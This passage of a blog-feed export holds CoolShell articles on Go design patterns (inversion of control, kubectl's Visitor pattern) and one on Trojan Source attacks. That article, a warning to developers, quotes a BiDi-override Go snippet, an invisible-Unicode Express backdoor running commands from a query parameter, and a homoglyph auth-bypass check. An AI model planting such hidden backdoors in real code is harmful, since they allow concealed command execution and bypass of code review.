garbage collection\n  }\n  *undo = functions[:index]\n  return nil\n}</pre>\n<p>这里你不必觉得奇怪， <code>Undo</code> 本来就是一个类型，不必是一个结构体，是一个函数数组也没什么问题。</p>\n<p>然后，我们在我们的IntSet里嵌入 Undo，然后，再在 <code>Add()</code> 和 <code>Delete()</code> 里使用上面的方法，就可以完成功能。</p>\n<pre data-enlighter-language=\"golang\" data-enlighter-highlight=\"3\">type IntSet struct {\n    data map[int]bool\n    undo Undo\n}\n \nfunc NewIntSet() IntSet {\n    return IntSet{data: make(map[int]bool)}\n}\n\nfunc (set *IntSet) Undo() error {\n    return set.undo.Undo()\n}\n \nfunc (set *IntSet) Contains(x int) bool {\n    return set.data[x]\n}\n\nfunc (set *IntSet) Add(x int) {\n    if !set.Contains(x) {\n        set.data[x] = true\n        set.undo.Add(func() { set.Delete(x) })\n    } else {\n        set.undo.Add(nil)\n    }\n}\n \nfunc (set *IntSet) Delete(x int) {\n    if set.Contains(x) {\n        delete(set.data, x)\n        set.undo.Add(func() { set.Add(x) })\n    } else {\n        set.undo.Add(nil)\n    }\n}</pre>\n<p>这个就是控制反转，不再由 控制逻辑 <code>Undo</code> 来依赖业务逻辑 <code>IntSet</code>，而是由业务逻辑 <code>IntSet</code> 来依赖 <code>Undo</code> 。其依赖的是其实是一个协议，这个协议是一个没有参数的函数数组。我们也可以看到，我们 Undo 的代码就可以复用了。</p>\n<p>（全文完）</p>\n<p align=\"center\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg\"> <img loading=\"lazy\" src=\"https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg\" width=\"300\" height=\"300\"> <br>关注CoolShell微信公众账号和微信小程序</p>\n<div>\n<p align=\"center\"><strong>（转载本站文章请注明作者和出处 <a href=\"https://coolshell.cn/\">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>\n</div>\n<div>——=== <b>访问 <a href=\"http://coolshell.cn/404/\" target=\"_blank\">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>\n\n<div><div><h3>相关文章</h3><ul><li><a href=\"https://coolshell.cn/articles/21615.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2021/09/go-generics-150x150.png\" alt=\"Go编程模式 ： 泛型编程\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/21615.html\">Go编程模式 ： 泛型编程</a></li><li><a href=\"https://coolshell.cn/articles/21263.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/12/go.k8s-150x150.png\" alt=\"Go 编程模式：k8s Visitor 模式\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/21263.html\">Go 编程模式：k8s Visitor 模式</a></li><li><a href=\"https://coolshell.cn/articles/21228.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/12/go.line_.-150x150.png\" alt=\"Go编程模式：Pipeline\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/21228.html\">Go编程模式：Pipeline</a></li><li><a href=\"https://coolshell.cn/articles/21179.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/12/go.generate-150x150.png\" alt=\"Go 编程模式：Go Generation\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/21179.html\">Go 编程模式：Go Generation</a></li><li><a href=\"https://coolshell.cn/articles/21164.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/12/go.map_.reduce-150x150.png\" alt=\"Go编程模式：Map-Reduce\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/21164.html\">Go编程模式：Map-Reduce</a></li><li><a href=\"https://coolshell.cn/articles/21146.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/12/go.options-150x150.png\" alt=\"Go 编程模式：Functional Options\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/21146.html\">Go 编程模式：Functional Options</a></li></ul></div></div>The post <a href=\"https://coolshell.cn/articles/21214.html\">Go编程模式：委托和反转控制</a> first appeared on <a href=\"https://coolshell.cn/\">酷 壳 - CoolShell</a>."
    },
    "origin": {
        "streamId": 10,
        "title": "酷壳",
        "htmlUrl": "https://coolshell.cn/",
        "feedUrl": "https://coolshell.cn/feed"
    }
},
{
    "id": "https://coolshell.cn/?p=21263",
    "timestampUsec": "1657644531898529",
    "categories": [
        "Go 语言",
        "程序设计",
        "编程语言",
        "design pattern",
        "Go",
        "golang",
        "Kubernetes",
        "Visitor Pattern",
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "Go 编程模式：k8s Visitor 模式",
    "author": ";陈皓",
    "published": 1608981900,
    "updated": 1608981900,
    "alternate": [
        {
            "href": "https://coolshell.cn/articles/21263.html",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<p><img loading=\"lazy\" src=\"https://coolshell.cn/wp-content/uploads/2020/12/go.k8s-265x300.png\" alt=\"\" width=\"265\" height=\"300\">本篇文章主要想讨论一下，Kubernetes 的 <code>kubectl</code> 命令中的使用到到的一个编程模式 – Visitor（注：其实，<code>kubectl</code> 主要使用到了两个一个是Builder，另一个是Visitor）。本来，Visitor 是面向对象设计模英中一个很重要的设计模款（参看Wikipedia<a href=\"https://en.wikipedia.org/wiki/Visitor_pattern\" target=\"_blank\" rel=\"noopener\"> Visitor Pattern词条</a>），这个模式是一种将算法与操作对象的结构分离的一种方法。这种分离的实际结果是能够在不修改结构的情况下向现有对象结构添加新操作，是遵循开放/封闭原则的一种方法。这篇文章我们重点看一下 <code>kubelet</code> 中是怎么使用函数式的方法来实现这个模式的。</p>\n<section><h3>本文是全系列中第9 / 10篇：<a href=\"https://coolshell.cn/articles/series/go%E7%BC%96%E7%A8%8B%E6%A8%A1%E5%BC%8F\">Go编程模式</a></h3><ul><li><span><a href=\"https://coolshell.cn/articles/21128.html\">Go编程模式：切片，接口，时间和性能</a></span></li><li><span><a href=\"https://coolshell.cn/articles/21140.html\">Go 编程模式：错误处理</a></span></li><li><span><a href=\"https://coolshell.cn/articles/21146.html\">Go 编程模式：Functional Options</a></span></li><li><span><a href=\"https://coolshell.cn/articles/21214.html\">Go编程模式：委托和反转控制</a></span></li><li><span><a href=\"https://coolshell.cn/articles/21164.html\">Go编程模式：Map-Reduce</a></span></li><li><span><a href=\"https://coolshell.cn/articles/21179.html\">Go 编程模式：Go Generation</a></span></li><li><span><a href=\"https://coolshell.cn/articles/17929.html\">Go编程模式：修饰器</a></span></li><li><span><a href=\"https://coolshell.cn/articles/21228.html\">Go编程模式：Pipeline</a></span></li><li><span>Go 编程模式：k8s Visitor 模式</span></li><li><span><a href=\"https://coolshell.cn/articles/21615.html\">Go编程模式 ： 泛型编程</a></span></li></ul><nav><span>« <a href=\"https://coolshell.cn/articles/21228.html\" rel=\"prev\" title=\"Go编程模式：Pipeline\">上一篇文章</a></span><span><a href=\"https://coolshell.cn/articles/21615.html\" rel=\"next\" title=\"Go编程模式 ： 泛型编程\">下一篇文章</a> »</span></nav></section>\n<h4>一个简单示例</h4>\n<p>我们还是先来看一个简单设计模式的Visitor的示例。</p>\n<ul>\n<li>我们的代码中有一个<code>Visitor</code>的函数定义，还有一个<code>Shape</code>接口，其需要使用 <code>Visitor</code>函数做为参数。</li>\n<li>我们的实例的对象 <code>Circle</code>和 <code>Rectangle</code>实现了 <code>Shape</code> 的接口的 <code>accept()</code> 方法，这个方法就是等外面给我传递一个Visitor。</li>\n</ul>\n<p><span></span></p>\n<pre data-enlighter-language=\"golang\">package main\n\nimport (\n    \"encoding/json\"\n    \"encoding/xml\"\n    \"fmt\"\n)\n\ntype Visitor func(shape Shape)\n\ntype Shape interface {\n    accept(Visitor)\n}\n\ntype Circle struct {\n    Radius int\n}\n\nfunc (c Circle) accept(v Visitor) {\n    v(c)\n}\n\ntype Rectangle struct {\n    Width, Heigh int\n}\n\nfunc (r Rectangle) accept(v Visitor) {\n    v(r)\n}\n</pre>\n<p>然后，我们实现两个Visitor，一个是用来做JSON序列化的，另一个是用来做XML序列化的</p>\n<pre data-enlighter-language=\"golang\">func JsonVisitor(shape Shape) {\n    bytes, err := json.Marshal(shape)\n    if err != nil {\n        panic(err)\n    }\n    fmt.Println(string(bytes))\n}\n\nfunc XmlVisitor(shape Shape) {\n    bytes, err := xml.Marshal(shape)\n    if err != nil {\n        panic(err)\n    }\n    fmt.Println(string(bytes))\n}\n</pre>\n<p>下面是我们的使用Visitor这个模式的代码</p>\n<pre data-enlighter-language=\"golang\">func main() {\n  c := Circle{10}\n  r :=  Rectangle{100, 200}\n  shapes := []Shape{c, r}\n\n  for _, s := range shapes {\n    s.accept(JsonVisitor)\n    s.accept(XmlVisitor)\n  }\n\n}</pre>\n<p>其实，这段代码的目的就是想解耦 数据结构和 算法，使用 Strategy 模式也是可以完成的，而且会比较干净。<strong>但是在有些情况下，多个Visitor是来访问一个数据结构的不同部分，这种情况下，数据结构有点像一个数据库，而各个Visitor会成为一个个小应用。</strong> <code>kubectl</code>就是这种情况。</p>\n<h4>k8s相关背景</h4>\n<p>接下来，我们再来了解一下相关的知识背景：</p>\n<ul>\n<li>对于Kubernetes，其抽象了很多种的Resource，比如：Pod, ReplicaSet, ConfigMap, Volumes, Namespace, Roles …. 种类非常繁多，这些东西构成为了Kubernetes的数据模型（点击 <a href=\"https://github.com/kubernauts/practical-kubernetes-problems/blob/master/images/k8s-resources-map.png\" target=\"_blank\" rel=\"noopener\">Kubernetes Resources 地图</a> 查看其有多复杂）</li>\n<li><code>kubectl</code> 是Kubernetes中的一个客户端命令，操作人员用这个命令来操作Kubernetes。<code>kubectl</code> 会联系到 Kubernetes 的API Server，API Server会联系每个节点上的 <code>kubelet</code> ，从而达到控制每个结点。</li>\n<li><code>kubectl</code> 主要的工作是处理用户提交的东西（包括，命令行参数，yaml文件等），然后其会把用户提交的这些东西组织成一个数据结构体，然后把其发送给 API Server。</li>\n<li>相关的源代码在 <code>src/k8s.io/cli-runtime/pkg/resource/visitor.go</code> 中（<a href=\"https://github.com/kubernetes/kubernetes/blob/cea1d4e20b4a7886d8ff65f34c6d4f95efcb4742/staging/src/k8s.io/cli-runtime/pkg/resource/visitor.go\" target=\"_blank\" rel=\"noopener\">源码链接</a>）</li>\n</ul>\n<p><code>kubectl</code> 的代码比较复杂，不过，其本原理简单来说，<strong>它从命令行和yaml文件中获取信息，通过Builder模式并把其转成一系列的资源，最后用 Visitor 模式模式来迭代处理这些Reources</strong>。</p>\n<p>下面我们来看看 <code>kubectl</code> 的实现，为了简化，我用一个小的示例来表明 ，而不是直接分析复杂的源码。</p>\n<h4>kubectl的实现方法</h4>\n<h5>Visitor模式定义</h5>\n<p>首先，<code>kubectl</code> 主要是用来处理 <code>Info</code>结构体，下面是相关的定义：</p>\n<pre data-enlighter-language=\"golang\">type VisitorFunc func(*Info, error) error\n\ntype Visitor interface {\n    Visit(VisitorFunc) error\n}\n\ntype Info struct {\n    Namespace   string\n    Name        string\n    OtherThings string\n}\nfunc (info *Info) Visit(fn VisitorFunc) error {\n  return fn(info, nil)\n}</pre>\n<p>我们可以看到，</p>\n<ul>\n<li>有一个 <code>VisitorFunc</code> 的函数类型的定义</li>\n<li>一个 <code>Visitor</code> 的接口，其中需要 <code>Visit(VisitorFunc) error</code>  的方法（这就像是我们上面那个例子的 <code>Shape</code> ）</li>\n<li>最后，为<code>Info</code> 实现 <code>Visitor</code> 接口中的 <code>Visit()</code> 方法，实现就是直接调用传进来的方法（与前面的例子相仿）</li>\n</ul>\n<p>我们再来定义几种不同类型的 Visitor。</p>\n<h5>Name Visitor</h5>\n<p>这个Visitor 主要是用来访问 <code>Info</code> 结构中的 <code>Name</code> 和 <code>NameSpace</code> 成员</p>\n<pre data-enlighter-language=\"golang\">type NameVisitor struct {\n  visitor Visitor\n}\n\nfunc (v NameVisitor) Visit(fn VisitorFunc) error {\n  return v.visitor.Visit(func(info *Info, err error) error {\n    fmt.Println(\"NameVisitor() before call function\")\n    err = fn(info, err)\n    if err == nil {\n      fmt.Printf(\"==&gt; Name=%s, NameSpace=%s\\n\", info.Name, info.Namespace)\n    }\n    fmt.Println(\"NameVisitor() after call function\")\n    return err\n  })\n}</pre>\n<p>我们可以看到，上面的代码：</p>\n<ul>\n<li>声明了一个 <code>NameVisitor</code> 的结构体，这个结构体里有一个 <code>Visitor</code> 接口成员，这里意味着多态。</li>\n<li>在实现 <code>Visit()</code> 方法时，其调用了自己结构体内的那个 <code>Visitor</code>的 <code>Visitor()</code> 方法，这其实是一种修饰器的模式，用另一个Visitor修饰了自己（关于修饰器模式，参看《<a title=\"Go编程模式：修饰器\" href=\"https://coolshell.cn/articles/17929.html\" target=\"_blank\" rel=\"noopener\">Go编程模式：修饰器</a>》）</li>\n</ul>\n<h5>Other Visitor</h5>\n<p>这个Visitor主要用来访问 <code>Info</code> 结构中的 <code>OtherThings</code> 成员</p>\n<pre data-enlighter-language=\"golang\">type OtherThingsVisitor struct {\n  visitor Visitor\n}\n\nfunc (v OtherThingsVisitor) Visit(fn VisitorFunc) error {\n  return v.visitor.Visit(func(info *Info, err error) error {\n    fmt.Println(\"OtherThingsVisitor() before call function\")\n    err = fn(info, err)\n    if err == nil {\n      fmt.Printf(\"==&gt; OtherThings=%s\\n\", info.OtherThings)\n    }\n    fmt.Println(\"OtherThingsVisitor() after call function\")\n    return err\n  })\n}</pre>\n<p>实现逻辑同上，我就不再重新讲了</p>\n<h5>Log Visitor</h5>\n<pre data-enlighter-language=\"golang\">type LogVisitor struct {\n  visitor Visitor\n}\n\nfunc (v LogVisitor) Visit(fn VisitorFunc) error {\n  return v.visitor.Visit(func(info *Info, err error) error {\n    fmt.Println(\"LogVisitor() before call function\")\n    err = fn(info, err)\n    fmt.Println(\"LogVisitor() after call function\")\n    return err\n  })\n}</pre>\n<h5>使用方代码</h5>\n<p>现在我们看看如果使用上面的代码：</p>\n<pre data-enlighter-language=\"golang\">func main() {\n  info := Info{}\n  var v Visitor = &amp;info\n  v = LogVisitor{v}\n  v = NameVisitor{v}\n  v = OtherThingsVisitor{v}\n\n  loadFile := func(info *Info, err error) error {\n    info.Name = \"Hao Chen\"\n    info.Namespace = \"MegaEase\"\n    info.OtherThings = \"We are running as remote team.\"\n    return nil\n  }\n  v.Visit(loadFile)\n}</pre>\n<p>上面的代码，我们可以看到</p>\n<ul>\n<li>Visitor们一层套一层</li>\n<li>我用 <code>loadFile</code> 假装从文件中读如数据</li>\n<li>最后一条 <code>v.Visit(loadfile)</code> 我们上面的代码就全部开始激活工作了。</li>\n</ul>\n<p>上面的代码输出如下的信息，你可以看到代码的执行顺序是怎么执行起来了</p>\n<pre data-enlighter-language=\"generic\">LogVisitor() before call function\nNameVisitor() before call function\nOtherThingsVisitor() before call function\n==&gt; OtherThings=We are running as remote team.\nOtherThingsVisitor() after call function\n==&gt; Name=Hao Chen, NameSpace=MegaEase\nNameVisitor() after call function\nLogVisitor() after call function</pre>\n<p>我们可以看到，上面的代码有以下几种功效：</p>\n<ul>\n<li>解耦了数据和程序。</li>\n<li>使用了修饰器模式</li>\n<li>还做出来pipeline的模式</li>\n</ul>\n<p>所以，其实，我们是可以把上面的代码重构一下的。</p>\n<h5>Visitor修饰器</h5>\n<p>下面，我们用<a title=\"Go编程模式：修饰器\" href=\"https://coolshell.cn/articles/17929.html\" target=\"_blank\" rel=\"noopener\">修饰器模式</a>来重构一下上面的代码。</p>\n<pre data-enlighter-language=\"golang\">type DecoratedVisitor struct {\n  visitor    Visitor\n  decorators []VisitorFunc\n}\n\nfunc NewDecoratedVisitor(v Visitor, fn ...VisitorFunc) Visitor {\n  if len(fn) == 0 {\n    return v\n  }\n  return DecoratedVisitor{v, fn}\n}\n\n// Visit implements Visitor\nfunc (v DecoratedVisitor) Visit(fn VisitorFunc) error {\n  return v.visitor.Visit(func(info *Info, err error) error {\n    if err != nil {\n      return err\n    }\n    if err := fn(info, nil); err != nil {\n      return err\n    }\n    for i := range v.decorators {\n      if err := v.decorators[i](info, nil); err != nil {\n        return err\n      }\n    }\n    return nil\n  })\n}</pre>\n<p>上面的代码并不复杂，</p>\n<ul>\n<li>用一个 <code>DecoratedVisitor</code> 的结构来存放所有的<code>VistorFunc</code>函数</li>\n<li><code>NewDecoratedVisitor</code> 可以把所有的 <code>VisitorFunc</code>转给它，构造 <code>DecoratedVisitor</code> 对象。</li>\n<li><code>DecoratedVisitor</code>实现了 <code>Visit()</code> 方法，里面就是来做一个for-loop，顺着调用所有的 <code>VisitorFunc</code></li>\n</ul>\n<p>于是，我们的代码就可以这样运作了：</p>\n<pre data-enlighter-language=\"generic\">info := Info{}\nvar v Visitor = &amp;info\nv = NewDecoratedVisitor(v, NameVisitor, OtherVisitor)\n\nv.Visit(LoadFile)</pre>\n<p>是不是比之前的那个简单？注意，这个<code>DecoratedVisitor</code> 同样可以成为一个Visitor来使用。</p>\n<p>好，上面的这些代码全部存在于 <code>kubectl</code> 的代码中，你看懂了这里面的代码逻辑，相信你也能够看懂 <code>kubectl</code> 的代码了。</p>\n<p>（全文完）</p>\n<p align=\"center\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg\"> <img loading=\"lazy\" src=\"https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg\" width=\"300\" height=\"300\"> <br>关注CoolShell微信公众账号和微信小程序</p>\n<div>\n<p align=\"center\"><strong>（转载本站文章请注明作者和出处 <a href=\"https://coolshell.cn/\">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>\n</div>\n<div>——=== <b>访问 <a href=\"http://coolshell.cn/404/\" target=\"_blank\">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>\n\n<div><div><h3>相关文章</h3><ul><li><a href=\"https://coolshell.cn/articles/21615.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2021/09/go-generics-150x150.png\" alt=\"Go编程模式 ： 泛型编程\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/21615.html\">Go编程模式 ： 泛型编程</a></li><li><a href=\"https://coolshell.cn/articles/21228.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/12/go.line_.-150x150.png\" alt=\"Go编程模式：Pipeline\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/21228.html\">Go编程模式：Pipeline</a></li><li><a href=\"https://coolshell.cn/articles/21214.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/12/go.pair_-150x150.png\" alt=\"Go编程模式：委托和反转控制\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/21214.html\">Go编程模式：委托和反转控制</a></li><li><a href=\"https://coolshell.cn/articles/21179.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/12/go.generate-150x150.png\" alt=\"Go 编程模式：Go Generation\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/21179.html\">Go 编程模式：Go Generation</a></li><li><a href=\"https://coolshell.cn/articles/21164.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/12/go.map_.reduce-150x150.png\" alt=\"Go编程模式：Map-Reduce\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/21164.html\">Go编程模式：Map-Reduce</a></li><li><a href=\"https://coolshell.cn/articles/21146.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/12/go.options-150x150.png\" alt=\"Go 编程模式：Functional Options\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/21146.html\">Go 编程模式：Functional Options</a></li></ul></div></div>The post <a href=\"https://coolshell.cn/articles/21263.html\">Go 编程模式：k8s Visitor 模式</a> first appeared on <a href=\"https://coolshell.cn/\">酷 壳 - CoolShell</a>."
    },
    "origin": {
        "streamId": 10,
        "title": "酷壳",
        "htmlUrl": "https://coolshell.cn/",
        "feedUrl": "https://coolshell.cn/feed"
    }
},
{
    "id": "https://coolshell.cn/?p=21649",
    "timestampUsec": "1657644531898532",
    "categories": [
        "网络安全",
        "hacker",
        "Unicode",
        "木马",
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "源代码特洛伊木马攻击",
    "author": ";陈皓",
    "published": 1637312520,
    "updated": 1637312520,
    "alternate": [
        {
            "href": "https://coolshell.cn/articles/21649.html",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<p><img loading=\"lazy\" src=\"https://coolshell.cn/wp-content/uploads/2021/11/il_340x270_pggv.jpg\" alt=\"\" width=\"340\" height=\"270\">最近，我们在 Github 的 Code Review 中看到 Github 开始出现下面这个 Warning 信息—— “This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below.”也就是说我们的代码中有一些 bidirectional unicode 的文本，中文直译作 “双向文本”，意思是一些语言是从左到右的，而另一些则是是从右到左的（如：阿拉伯语），如果同一个文件里，即有从左向右的文本也有从右向左文本两种的混搭，那么，就叫bi-direction。术语通常缩写为“ <b>BiDi</b> ”或“ <b>bidi</b> ”。使用双向文本对于中国人来说并不陌生，因为中文又可以从左到右，也可以从右到左，还可以从上到下。</p>\n<p><img loading=\"lazy\" src=\"https://coolshell.cn/wp-content/uploads/2021/11/1637305049427-1024x329.jpg\" alt=\"\" width=\"640\" height=\"206\"></p>\n<p>早期的计算机仅设计为基于拉丁字母的从左到右的方式。添加新的字符集和字符编码使许多其他从左到右的脚本能够得到支持，但不容易支持从右到左的脚本，例如阿拉伯语或希伯来语，并且将两者混合使用更是不可能。从右到左的脚本是通过<a title=\"ISO/IEC 8859-6\" href=\"https://en.wikipedia.org/wiki/ISO/IEC_8859-6\">ISO/IEC 8859-6</a>和<a title=\"ISO/IEC 8859-8\" href=\"https://en.wikipedia.org/wiki/ISO/IEC_8859-8\">ISO/IEC 8859-8</a>等编码引入的，通常以书写和阅读顺序存储字母。可以简单地将从左到右的显示顺序翻转为从右到左的显示顺序，但这样做会牺牲正确显示从左到右脚本的能力。通过双向文本支持，可以在同一页面上混合来自不同脚本的字符，而不管书写方向如何。</p>\n<p><span></span></p>\n<p>双向文本支持是计算机系统正确显示双向文本的能力。对于Unicode来说，其标准为完整的 BiDi 支持提供了基础，其中包含有关如何编码和显示从左到右和从右到左脚本的混合的详细规则。你可以使用一些控制字符来帮助你完成双向文本的编排。</p>\n<p>好的，科普完“双向文本”后，我们正式进入正题，为什么Github 会出这个警告？Github的官方博客“<a href=\"https://github.blog/changelog/2021-10-31-warning-about-bidirectional-unicode-text/\" target=\"_blank\" rel=\"noopener\">关于双向Unicode的警告</a>”中说，使用一些Unicode中的用于控制的隐藏字符，可以让你代码有着跟看上去完全不一样的行为。</p>\n<p>我们先来看一个示例，下面这段 Go 的代码就会把 “Hello, World”的每个字符转成整型，然后计算其中多少个为 1 的 bit。</p>\n<pre data-enlighter-language=\"golang\">package main\n\nimport \"fmt\"\n\nfunc main() {\n  str, mask := \"Hello, World!‮10x‭\", 0\n\n  bits := 0\n  for _, ch := range str {\n    for ch &gt; 0 {\n      bits += int(ch) &amp; mask\n      ch = ch &gt;&gt; 1\n    }\n  }\n  fmt.Println(\"Total bits set:\", bits)\n}</pre>\n<p>这个代码你看上去没有什么 奇怪的地方，但是你在执行的时候（可以直接上Go Playground上执行  –<a href=\"https://play.golang.org/p/e2BDZvFlet0\" target=\"_blank\" rel=\"noopener\"> https://play.golang.org/p/e2BDZvFlet0</a>），你会发现，结果是 0，也就是说“Hello, World”中没有值为 1 的 bit 位。这究竟发生了什么事？</p>\n<p>如果你把上面这段代码拷贝粘贴到字符界面上的 vim 编辑器里，你就可以看到下面这一幕。</p>\n<p><img loading=\"lazy\" src=\"https://coolshell.cn/wp-content/uploads/2021/11/1637307319589.jpg\" alt=\"\" width=\"500\" height=\"324\"></p>\n<p>其中有两个浅蓝色的尖括号的东西—— <code>&lt;202e&gt;</code> 和 <code>&lt;202d&gt;</code> 。这两个字符是两个Unicode的控制字符（注：完整的双向文本控制字符参看 <a href=\"https://www.compart.com/en/unicode/bidiclass\" target=\"_blank\" rel=\"noopener\">Unicode Bidirectional Classes</a>）：</p>\n<ul>\n<li><strong>U+202E – Right-to-Left Override [RLO] </strong><br>\n表示，开始从右到左显示，于是，接下来的文本 <code>10x\", 0</code> 变成了 <code>0 ,\"x01</code></li>\n<li><strong>U+202D – Left-to-Right Override [LRO]</strong><br>\n表示，开始从左到右显示，于是，<code>0,\"x01</code> 中的前4个字符<code>0 ,\"</code> 反转成  <code>\", 0</code>，于是整个文本成了 <code>\", 0x01</code></li>\n</ul>\n<p>所以，你在视觉上看到的是结果是—— <code>\"Hello, World!”, 0x01</code>， 但是实际上是完全是另外一码事。</p>\n<p>然后，Github官方博客中还给了一个安全问题 <a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-42574\">CVE-2021-42574</a> ——</p>\n<blockquote><p>在 Unicode 规范到 14.0 的双向算法中发现了一个问题。它允许通过控制序列对字符进行视觉重新排序，可用于制作源代码，呈现与编译器和解释器执行逻辑完全不同的逻辑。攻击者可以利用这一点对接受 Unicode 的编译器的源代码进行编码，从而将目标漏洞引入人类审查者不可见的地方。</p></blockquote>\n<p>这个安全问题在剑桥大学的这篇论文“<a href=\"https://www.trojansource.codes/\" target=\"_blank\" rel=\"noopener\">Some Vulnerabilities are Invisible</a>”中有详细的描述。其中PDF版的文章中也给了这么一个示例：</p>\n<p>通过双向文本可以把下面这段代码：</p>\n<p><img loading=\"lazy\" src=\"https://coolshell.cn/wp-content/uploads/2021/11/1637308872541.jpg\" alt=\"\" width=\"569\" height=\"240\"></p>\n<p>伪装成下面的这个样子：</p>\n<p><img loading=\"lazy\" src=\"https://coolshell.cn/wp-content/uploads/2021/11/1637308847435.jpg\" alt=\"\" width=\"580\" height=\"245\"></p>\n<p>在图 2 中<code>'alice'</code>被定义为价值 100，然后是一个从 Alice 中减去资金的函数。最后一行以 50 的值调用该函数，因此该小程序在执行时应该给我们 50 的结果。</p>\n<p>然而，图 1 向我们展示了如何使用双向字符来破坏程序的意图：通过插入<strong>RLI (Right To Left Isolate)</strong><i> – </i><strong>U+2067</strong><i>，</i>我们将文本方向从传统英语更改为从右到左。尽管我们使用了减去资金功能，但图 1 的输出变为 100。</p>\n<p>除此之外，支持Unicode还可以出现很多其它的攻击，尤其是通过一些“不可见字符”，或是通过“同形字符”在源代码里面埋坑。比如文章“<a href=\"https://certitude.consulting/blog/en/invisible-backdoor/\" target=\"_blank\" rel=\"noopener\">The Invisible Javascript Backdoor</a>”里的这个示例：</p>\n<pre data-enlighter-language=\"js\">const express = require('express');\nconst util = require('util');\nconst exec = util.promisify(require('child_process').exec);\n\nconst app = express();\n\napp.get('/network_health', async (req, res) =&gt; {\n    const { timeout,ㅤ} = req.query;\n    const checkCommands = [\n        'ping -c 1 google.com',\n        'curl -s http://example.com/',ㅤ\n    ];\n\n    try {\n        await Promise.all(checkCommands.map(cmd =&gt; \n                cmd &amp;&amp; exec(cmd, { timeout: +timeout || 5_000 })));\n        res.status(200);\n        res.send('ok');\n    } catch(e) {\n        res.status(500);\n        res.send('failed');\n    }\n});\n\napp.listen(8080);</pre>\n<p>上面这个代码实现了一个非常简单的网络健康检查，HTTP会执行 <code>ping -c 1 google.com</code> 以及 <code>curl -s http://example.com</code> 这两个命令来查看网络是否正常。其中，可选输入 HTTP 参数<code>timeout</code>限制命令执行时间。</p>\n<p>然后，上面这个代码是有不可见的Unicode 字符，如果你使用VSCode，把编码从 Unicode 改成 DOS (CP437) 后你就可以看到这个Unicode了</p>\n<p><img loading=\"lazy\" src=\"https://coolshell.cn/wp-content/uploads/2021/11/1637310735683-1024x923.jpg\" alt=\"\" width=\"640\" height=\"577\"></p>\n<p>于是，一个你看不见的 <code>πàñ</code> 变量就这样生成了，你再仔细看一下整个逻辑，这个看不见的变量，可以让你的代码执行他想要的命令。因为，http 的请求中有第二个参数，这个参数可奖在后面被执行。于是我们可以构造如下的的 HTTP 请求：</p>\n<p><strong>http://host:port/network_health?%E3%85%A4=&lt;any command&gt;</strong></p>\n<p>其中的，%E3%85%A4 就是 <code>\\u3164</code> 这个不可见Unicode 的编码，于是，一个后门代码就这样在神不知鬼不觉的情况下注入了。</p>\n<p>另外，还可以使用“同形字符”，看看下面这个示例：</p>\n<pre data-enlighter-language=\"c\">if(environmentǃ=ENV_PROD){\n    // bypass authZ checks in DEV\n    return true;\n}</pre>\n<p>如何你以为 <code>ǃ</code> 是 惊叹号，其实不是，它是一个Unicode <code>╟â</code>。这种东西就算你把你的源码转成 DOS(CP437) 也没用，因为用肉眼在一大堆正常的字符中找不正常的，我觉得是基本不可能的事。</p>\n<p>现在，是时候检查一下你的代码有没有上述的这些情况了……</p>\n<p>（全文完）</p>\n<p> </p>\n<p> </p>\n<p align=\"center\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg\"> <img loading=\"lazy\" src=\"https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg\" width=\"300\" height=\"300\"> <br>关注CoolShell微信公众账号和微信小程序</p>\n<div>\n<p align=\"center\"><strong>（转载本站文章请注明作者和出处 <a href=\"https://coolshell.cn/\">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>\n</div>\n<div>——=== <b>访问 <a href=\"http://coolshell.cn/404/\" target=\"_blank\">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>\n\n<div><div><h3>相关文章</h3><ul><li><a href=\"https://coolshell.cn/articles/3684.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2011/02/1128-150x150.jpg\" alt=\"Web开发人员速查卡\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/3684.html\">Web开发人员速查卡</a></li><li><a href=\"https://coolshell.cn/articles/2439.html\"><img 